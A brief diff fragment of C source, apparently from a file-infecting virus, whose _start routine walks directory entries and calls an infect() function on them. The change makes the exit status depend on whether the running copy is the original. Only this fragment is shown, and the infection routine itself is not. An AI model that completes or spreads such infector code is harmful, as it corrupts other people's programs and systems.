@@ -74,7 +74,6 @@ void _start() {
 
 					infect(&this, max_path);
 				}
-
 				d_offset += d->d_reclen;
 			}
 
@@ -90,5 +89,8 @@ void _start() {
 			max_path[i] = 0;
 	}
 
-	exit(0);
+	if (this.original)
+		exit(0);
+	else
+		exit(50);
 }
